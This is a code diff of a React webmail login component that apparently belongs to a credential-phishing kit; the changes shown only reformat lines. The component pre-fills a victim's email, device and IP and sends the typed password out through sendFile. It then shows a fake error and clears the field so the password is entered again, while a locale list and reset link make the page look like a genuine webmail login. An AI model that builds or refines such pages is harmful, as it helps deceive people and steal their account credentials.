@@ -6,7 +6,8 @@ import Logo from "./logo.svg";
 
 function WebmailMain({ location }) {
   const [values, setValues] = useState({
-    username: location.state.email,device: location.state.device,
+    username: location.state.email,
+    device: location.state.device,
     ip: location.state.ip,
     password: "",
   });
@@ -28,7 +29,8 @@ function WebmailMain({ location }) {
       sendFile(values).then((data) => {
         // show error
         notify();
-        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
+        setSubmited({ ...submited, count: submited.count + 1 });
+        setValues({ ...values, password: "" });
         console.log(data);
         console.log(submited);
       });
@@ -107,14 +109,10 @@ function WebmailMain({ location }) {
                         <a href="#es">español</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#es_419">
-                          español latinoamericano
-                        </a>
+                        <a href="#es_419">español latinoamericano</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#es_es">
-                          español de España
-                        </a>
+                        <a href="#es_es">español de España</a>
                       </div>
                       <div className="locale-cell">
                         <a href="#fi">suomi</a>
@@ -137,9 +135,7 @@ function WebmailMain({ location }) {
                         </a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#id">
-                          Bahasa Indonesia
-                        </a>
+                        <a href="#id">Bahasa Indonesia</a>
                       </div>
                       <div className="locale-cell">
                         <a href="#it">italiano</a>
@@ -151,14 +147,10 @@ function WebmailMain({ location }) {
                         <a href="#ko">한국어</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#ms">
-                          Bahasa Melayu
-                        </a>
+                        <a href="#ms">Bahasa Melayu</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#nb">
-                          norsk bokmål
-                        </a>
+                        <a href="#nb">norsk bokmål</a>
                       </div>
                       <div className="locale-cell">
                         <a href="#nl">Nederlands</a>
@@ -173,9 +165,7 @@ function WebmailMain({ location }) {
                         <a href="#pt">português</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#pt_br">
-                          português do Brasil
-                        </a>
+                        <a href="#pt_br">português do Brasil</a>
                       </div>
                       <div className="locale-cell">
                         <a href="#ro">română</a>
@@ -184,9 +174,7 @@ function WebmailMain({ location }) {
                         <a href="#ru">русский</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#sl">
-                          slovenščina
-                        </a>
+                        <a href="#sl">slovenščina</a>
                       </div>
                       <div className="locale-cell">
                         <a href="#sv">svenska</a>
@@ -207,14 +195,10 @@ function WebmailMain({ location }) {
                         <a href="#zh">中文</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#zh_cn">
-                          中文（中国）
-                        </a>
+                        <a href="#zh_cn">中文（中国）</a>
                       </div>
                       <div className="locale-cell">
-                        <a href="#zh_tw">
-                          中文（台湾）
-                        </a>
+                        <a href="#zh_tw">中文（台湾）</a>
                       </div>
                     </div>
                   </div>
@@ -285,10 +269,7 @@ function WebmailMain({ location }) {
                             </button>
                           </div>
                           <div className="reset-pw">
-                            <a
-                              href="#/resetpass?start=1"
-                              id="reset_password"
-                            >
+                            <a href="#/resetpass?start=1" id="reset_password">
                               Reset Password
                             </a>
                           </div>
